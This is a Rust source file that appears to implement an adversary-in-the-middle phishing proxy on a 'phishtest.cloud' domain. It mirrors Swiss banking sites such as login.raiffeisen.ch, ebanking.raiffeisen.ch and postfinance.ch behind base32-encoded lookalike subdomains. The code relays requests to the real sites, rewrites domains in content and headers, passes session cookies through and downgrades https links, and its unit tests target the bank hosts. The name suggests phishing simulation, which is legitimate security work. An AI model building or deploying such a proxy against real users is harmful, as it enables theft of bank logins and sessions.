mod clearance;
mod config;
mod csp;
mod turnstile;

use crate::config::{load, Config, Mapping, Targets};
use axum::extract::{Path, Query, RawQuery};
use axum::http::{HeaderMap, HeaderName, Method, StatusCode};
use axum::response::IntoResponse;
use axum::routing::{delete, get, post, put};
use axum::{Json, Router};
use bytes::Bytes;
use cookie::CookieBuilder;
use lazy_static::lazy_static;
use notify::{EventKind, RecursiveMode, Watcher};
use regex::{Captures, Regex, Replacer};
use reqwest::redirect::Policy;
use reqwest::{Body, Client, ClientBuilder, Url};
use serde::Deserialize;
use std::collections::HashSet;
use std::path;
use std::string::ToString;
use std::sync::{mpsc, Arc, RwLock};
use tower::ServiceBuilder;
use tower_http::services::ServeDir;

lazy_static! {
    static ref client: Client = ClientBuilder::new()
        .redirect(Policy::none())
        .build()
        .unwrap();
}

lazy_static! {
    static ref loaded_config: Arc<RwLock<Option<Config>>> = Arc::new(RwLock::new(None));
}

#[derive(Deserialize)]
struct CheckToken {
    token: String,
}

#[derive(Deserialize, Debug)]
struct TrunstileResponse {
    success: bool,
    challenge_ts: Option<String>,
    hostname: Option<String>,
    error_codes: Option<Vec<String>>,
}

async fn check_token(Json(payload): Json<CheckToken>) -> impl IntoResponse {
    let secret = "";

    let result = turnstile::check(&payload.token, secret).await.unwrap();
    println!("Result: {:?}", result);
}

#[derive(Debug, Deserialize)]
struct CspParams {
    session_id: String,
}

#[axum::debug_handler]
async fn csp_report(
    Query(params): Query<CspParams>,
    Json(report): Json<csp::Root>,
) -> impl IntoResponse {
}

fn active_config(config: &Option<Config>, url: &str) -> Option<Targets> {
    match &config {
        None => {}
        Some(config) => {
            if let Some(targets) = &config.targets {
                for target in targets {
                    if target
                        .url
                        .iter()
                        .any(|i| Regex::new(i).unwrap().is_match(url))
                    {
                        return Some(target.clone());
                    }
                }
            }
        }
    }
    None
}

fn filter_headers<TTransformer>(
    request_header: &mut HeaderMap,
    mapping: &Mapping,
    transformer: TTransformer,
) where
    TTransformer: Fn(String) -> String,
{
    if let Some(headers) = &mapping.headers {
        for header_config in headers {
            if let Some(value) = &header_config.value {
                let key = HeaderName::from_bytes(header_config.key.as_bytes()).unwrap();
                request_header.insert(key, value.parse().unwrap());
            }else{
                request_header.remove(&header_config.key);
            }
        }
    }

    if mapping.rewrite {
        for (key, value) in &request_header.clone() {
            if let Ok(value) = value.to_str() {
                let new_value = transformer(value.to_string());
                request_header.insert(key, new_value.parse().unwrap());
            }
        }
    }
}

async fn get_root(
    path: Option<Path<String>>,
    method: Method,
    RawQuery(params): RawQuery,
    mut request_header: HeaderMap,
    mut body: Bytes,
) -> impl IntoResponse {
    let domain = "local-dev.phishtest.cloud:53001";

    let path = path.map(|i| i.0).unwrap_or_else(|| "".to_string());

    let lc = loaded_config.clone();
    let config = lc.read().unwrap().clone();

    // println!("Body: {}", body.len());

    let mut response_headers = HeaderMap::new();
    let target = active_config(&config, &path);
    println!("{:?}", target);

    // response_headers.insert(
    //     "Content-Security-Policy",
    //     format!("default-src 'self' http://*.{domain}/ data:; style-src 'self' http://*.{domain}/ 'unsafe-inline'; script-src 'self' http://*.{domain}/ 'unsafe-inline' 'unsafe-eval'")
    //         .parse()
    //         .unwrap(),
    // );
    // response_headers.insert("Referrer-Policy", "same-origin".parse().unwrap());

    // println!("Start domain: {}", STANDARD_NO_PAD.encode("www.raiffeisen.ch"));

    let host: &str = request_header.get("Host").unwrap().to_str().unwrap();
    let subdomain = host.split(".").next().unwrap();
    // println!("Host: {}->{}", host, subdomain);

    let data =
        base32::decode(base32::Alphabet::Rfc4648Lower { padding: false }, subdomain).unwrap();
    let subdomain = String::from_utf8(data).unwrap();

    // println!("Host: {}->{}", host, subdomain);

    if let Some(target) = &target {
        if let Some(static_response) = &target.static_response {
            return (StatusCode::from_u16(static_response.status).unwrap(), response_headers, Bytes::new());
        }
    }

    // if path.contains("rfdwdc/") || path.contains("fcs2/") {
    //     return (StatusCode::NOT_FOUND, response_headers, Bytes::new());
    // }
    // if path.contains("unsupported-browser/") {
    //     return (StatusCode::NOT_FOUND, response_headers, Bytes::new());
    // }

    // fixed removals
    request_header.remove("host");
    request_header.remove("origin");
    request_header.remove("accept-encoding");
    request_header.remove("content-length");

    if let Some(target) = &target {
        if let Some(mapping) = &target.request {
            filter_headers(&mut request_header, mapping, |i| {
                reverse_translate_domains(i, domain)
            });
        }
    }

    // println!("{:#?}", request_header);
    // request_header.remove("referer");

    let mut url = Url::parse(&format!("https://{subdomain}/{path}")).unwrap();
    if let Some(query) = params {
        url.set_query(Some(query.as_str()));
    }

    // println!("Url: {}", url);

    // transform post-body
    if let Ok(string_post_content) = String::from_utf8(body.to_vec()) {
        body = Bytes::from(reverse_translate_domains(string_post_content, domain));
    }

    let res = client
        .request(method, url)
        .headers(request_header)
        .body(Body::from(body))
        .send()
        .await
        .unwrap();

    for cookie in res.cookies() {
        let mut builder = CookieBuilder::new(cookie.name(), cookie.value());
        if let Some(path) = cookie.path() {
            builder = builder.path(path);
        }
        response_headers.append("Set-Cookie", builder.build().to_string().parse().unwrap());
    }

    println!("Response: {:?}", res);

    let status_code = res.status();
    
    let ignored = HashSet::from(["set-cookie"]);
    for (key, value) in res.headers() {
        if ignored.contains(&key.as_str()) {
           continue; 
        }
        response_headers.insert(key, value.clone());
    }

    let validator = HashSet::from_iter(config.map(|i|i.domains).unwrap_or_else(|| Vec::new()));

    response_headers.remove("transfer-encoding");
    response_headers.remove("content-length");
    response_headers.remove("keep-alive");
    response_headers.remove("connection");

    if let Some(target) = &target {
        if let Some(mapping) = &target.response {
            filter_headers(&mut response_headers, mapping, |i| {
                translate_domains(i, domain, true, validator.clone())
            });
        }
    }

    // println!("Headers: {:?}", response_headers);

    let mut content = res.bytes().await.unwrap();

    if let Ok(string_content) = String::from_utf8(content.to_vec()) {
        content = Bytes::from(translate_domains(string_content, domain, true, validator));
    }

    // builder.body(content).unwrap()
    // (headers, )
    (status_code, response_headers, content)
}

#[tokio::main]
async fn main() {
    let (tx, rx) = mpsc::channel();

    let mut watcher = notify::recommended_watcher(tx).unwrap();

    // Add a path to be watched. All files and directories at that path and
    // below will be monitored for changes.
    watcher
        .watch(path::Path::new("config.toml"), RecursiveMode::NonRecursive)
        .unwrap();

    let config = load("config.toml").unwrap();
    {
        let mut guard = loaded_config.write().unwrap();
        *guard = Some(config);
        println!("Config applied");
    }
    tokio::spawn(async move {
        for item in rx {
            if let Ok(event) = item {
                if let EventKind::Modify(_) = event.kind {
                    if let Ok(config) = load("config.toml") {
                        let mut guard = loaded_config.write().unwrap();
                        *guard = Some(config);
                        println!("Config applied");
                    }
                }
            }
        }
    });

    // Convert the proxy to a router and use it in your Axum application
    let app: Router = Router::new()
        .route("/", get(get_root))
        .route("/{*path}", get(get_root))
        .route("/{*path}", delete(get_root))
        .route("/{*path}", post(get_root))
        .route("/{*path}", put(get_root))
        .route("/_api/csp", post(csp_report))
        .route("/_clearance/check", post(check_token))
        .nest_service(
            "/_clearance",
            ServiceBuilder::new().service(ServeDir::new("static")),
        );

    let listener = tokio::net::TcpListener::bind("0.0.0.0:53001")
        .await
        .unwrap();
    axum::serve(listener, app).await.unwrap();
}

struct NameSwapper<'a, TValidator: DomainValidator> {
    domain_suffix: &'a str,
    validator: TValidator,
    downgrade: bool,
}

impl<'a, TValidator> Replacer for NameSwapper<'a, TValidator>
where
    TValidator: DomainValidator,
{
    fn replace_append(&mut self, caps: &Captures<'_>, dst: &mut String) {
        if self.validator.validate(&caps[2]) {
            if let Some(scheme) = caps.get(1) {
                if self.downgrade && scheme.as_str().starts_with("http") {
                    dst.push_str("http://");
                } else {
                    dst.push_str(scheme.as_str());
                }
            }

            dst.push_str(&encode_domain(&caps[2]));
            dst.push_str(".");
            dst.push_str(self.domain_suffix);
        } else {
            dst.push_str(&caps[0]);
        }
    }
}

struct NameReverseSwapper<'a> {
    target_domain: &'a str,
}

impl<'a> Replacer for NameReverseSwapper<'a> {
    fn replace_append(&mut self, caps: &Captures<'_>, dst: &mut String) {
        if let Some(scheme) = caps.get(1) {
            if scheme.as_str().starts_with("http") {
                dst.push_str("https://");
            } else {
                dst.push_str(&scheme.as_str());
            }
        }

        let domain = &caps[2];
        if !domain.ends_with(self.target_domain) {
            dst.push_str(&caps[2]);
            return;
        }

        let domain = decode_domain(&domain[..domain.len() - self.target_domain.len() - 1]);
        dst.push_str(&domain);
    }
}

lazy_static! {
    static ref pattern: Regex = Regex::new(r"(?<scheme>(?:https?:)?\/\/)?((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9](?:\:[0-9]{1,5})?)").unwrap();
}

trait DomainValidator {
    fn validate(&self, domain: &str) -> bool;
}

impl DomainValidator for HashSet<&str> {
    fn validate(&self, domain: &str) -> bool {
        self.contains(domain)
    }
}

impl DomainValidator for HashSet<String> {
    fn validate(&self, domain: &str) -> bool {
        self.contains(domain)
    }
}

fn translate_domains(
    input: String,
    domain_suffix: &str,
    downgrade: bool,
    validator: impl DomainValidator,
) -> String {
    pattern
        .replace_all(
            input.as_str(),
            NameSwapper {
                domain_suffix,
                downgrade,
                validator,
            },
        )
        .to_string()
}

fn reverse_translate_domains(input: String, domain: &str) -> String {
    pattern
        .replace_all(
            input.as_str(),
            NameReverseSwapper {
                target_domain: domain,
            },
        )
        .to_string()
}

fn encode_domain(domain: &str) -> String {
    let alphabet = base32::Alphabet::Rfc4648Lower { padding: false };
    base32::encode(alphabet, domain.as_bytes())
}
fn decode_domain(domain: &str) -> String {
    let alphabet = base32::Alphabet::Rfc4648Lower { padding: false };
    String::from_utf8(base32::decode(alphabet, domain).unwrap()).unwrap()
}

#[cfg(test)]
mod tests {
    use crate::{decode_domain, encode_domain, reverse_translate_domains, translate_domains};
    use std::collections::HashSet;

    #[test]
    fn test_encoding() {
        let input = encode_domain("www.raiffeisen.ch");
        assert_eq!("o53xoltsmfuwmztfnfzwk3romnua", input);

        let data = decode_domain(input.as_str());
        assert_eq!("www.raiffeisen.ch", data);

        let input = encode_domain("login.raiffeisen.ch");
        assert_eq!("nrxwo2lofzzgc2lgmzsws43fnyxgg2a", input);

        let input = encode_domain("ebanking.raiffeisen.ch");
        assert_eq!("mvrgc3tlnfxgoltsmfuwmztfnfzwk3romnua", input);

        let input = encode_domain("memberplus.raiffeisen.ch");
        assert_eq!("nvsw2ytfojygy5ltfzzgc2lgmzsws43fnyxgg2a", input);

        let input = encode_domain("www.postfinance.ch");
        assert_eq!("o53xoltqn5zxiztjnzqw4y3ffzrwq", input);
    }

    #[test]
    fn test_content_rewrite() {
        let validator = HashSet::from(["login.raiffeisen.ch", "ebanking.raiffeisen.ch"]);

        let input = "hreflang=\"it-CH\" href=\"https://login.raiffeisen.ch/it\"/>";

        let output = translate_domains(input.to_string(), "domain.local", false, validator.clone());
        assert_eq!(
            "hreflang=\"it-CH\" href=\"https://nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local/it\"/>",
            output
        );

        let output = translate_domains(input.to_string(), "domain.local", true, validator.clone());
        assert_eq!(
            "hreflang=\"it-CH\" href=\"http://nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local/it\"/>",
            output
        );

        let output = translate_domains(
            "hreflang=\"it-CH\" href=\"//login.raiffeisen.ch/it\"/>".to_string(),
            "domain.local",
            true,
            validator.clone(),
        );
        assert_eq!(
            "hreflang=\"it-CH\" href=\"//nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local/it\"/>",
            output
        );

        let output = translate_domains(
            "ipt src=\"/rfdwdc/static/modernizr.js\" asyn".to_string(),
            "domain.local",
            true,
            validator.clone(),
        );
        assert_eq!("ipt src=\"/rfdwdc/static/modernizr.js\" asyn", output);

        let output = translate_domains(
            "hreflang=\"it-CH\" href=\"//login.raiffeisen.ch\"/>".to_string(),
            "domain.local",
            true,
            validator.clone(),
        );
        assert_eq!(
            "hreflang=\"it-CH\" href=\"//nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local\"/>",
            output
        );

        let output = translate_domains(
            "hreflang=\"it-CH\" href=\"webpack://blabla/it\"/>".to_string(),
            "domain.local",
            true,
            validator.clone(),
        );
        assert_eq!("hreflang=\"it-CH\" href=\"webpack://blabla/it\"/>", output);

        let output = translate_domains(
            "amai?\"https://fast.\":\"https://\"),t=r+this.subdoma".to_string(),
            "domain.local",
            true,
            validator.clone(),
        );
        assert_eq!(
            "amai?\"https://fast.\":\"https://\"),t=r+this.subdoma",
            output
        );
    }

    #[test]
    fn test_content_reverse_rewrite() {
        // let output = reverse_translate_domains(
        //     "hreflang=\"it-CH\" href=\"https://nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local/it\"/>"
        //         .to_string(),
        //     "domain.local",
        // );
        // assert_eq!(
        //     "hreflang=\"it-CH\" href=\"https://login.raiffeisen.ch/it\"/>",
        //     output
        // );

        let output = reverse_translate_domains(
            "nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local".to_string(),
            "domain.local",
        );
        assert_eq!("login.raiffeisen.ch", output);

        let output = reverse_translate_domains(
            "location\":\"https://mvrgc3tlnfxgoltsmfuwmztfnfzwk3romnua.local-dev.phishtest.cloud:53001/app/\"".to_string(),
            "local-dev.phishtest.cloud:53001",
        );
        assert_eq!("location\":\"https://ebanking.raiffeisen.ch/app/\"", output);

        let output = reverse_translate_domains(
            "location\":\"http://mvrgc3tlnfxgoltsmfuwmztfnfzwk3romnua.local-dev.phishtest.cloud:53001/app/\"".to_string(),
            "local-dev.phishtest.cloud:53001",
        );
        assert_eq!("location\":\"https://ebanking.raiffeisen.ch/app/\"", output);
    }
}
